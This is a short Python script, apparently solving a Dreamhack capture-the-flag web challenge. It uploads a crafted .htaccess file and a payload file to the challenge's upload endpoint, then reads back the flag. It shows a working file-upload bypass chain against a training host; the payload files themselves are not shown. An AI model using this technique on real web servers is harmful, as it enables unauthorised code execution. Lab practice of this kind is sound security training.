import requests
import os
import re

HOST = "http://host1.dreamhack.games"
PORT = 20925
BASE_PATH = os.path.dirname(os.path.abspath(__file__))

res = requests.post(
    f"{HOST}:{PORT}/upload.php", files={"file": open(f"{BASE_PATH}/.htaccess", "rb")}
)
# print(res.text) # Stored in: <a href='/upload/.htaccess'>/upload/.htaccess</a>

res = requests.post(
    f"{HOST}:{PORT}/upload.php", files={"file": open(f"{BASE_PATH}/ans.test", "rb")}
)
# print(res.text) # Stored in: <a href='/upload/ans.test'>/upload/ans.test</a>

res = requests.get(f"{HOST}:{PORT}/upload/ans.test")
flag = re.search(r"DH{.*}", res.text).group()
print(flag)
